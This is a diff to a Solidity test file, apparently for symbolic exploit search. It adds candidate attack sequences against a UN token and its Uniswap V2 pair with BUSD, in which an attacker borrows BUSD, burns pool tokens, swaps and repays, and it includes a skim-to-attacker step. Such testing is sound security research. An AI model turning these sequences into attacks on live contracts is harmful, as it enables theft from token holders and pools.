@@ -8,7 +8,7 @@ import {BUSD} from "@utils/BUSD.sol";
 import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
-contract UNTestBase is Test, BlockLoader {
+contract UNTest is Test, BlockLoader {
     BUSD busd;
     UN un;
     UniswapV2Pair pair;
@@ -149,6 +149,61 @@ contract UNTestBase is Test, BlockLoader {
         un.transfer(address(pair), amount);
         pair.skim(attacker);
         pair.sync();
+    }
+    function check_cand000(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_busd_owner(amt0);
+        swap_pair_attacker_busd_un(amt1, amt2);
+        swap_pair_attacker_un_busd(amt3, amt4);
+        payback_busd_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+    function check_cand001(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_busd_owner(amt0);
+        burn_un_pair(amt1);
+        swap_pair_attacker_busd_un(amt2, amt3);
+        swap_pair_attacker_un_busd(amt4, amt5);
+        payback_busd_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+    function check_cand002(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_busd_owner(amt0);
+        swap_pair_attacker_busd_un(amt1, amt2);
+        burn_un_pair(amt3);
+        swap_pair_attacker_un_busd(amt4, amt5);
+        payback_busd_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
     }
     function test_gt() public {
         vm.startPrank(attacker);
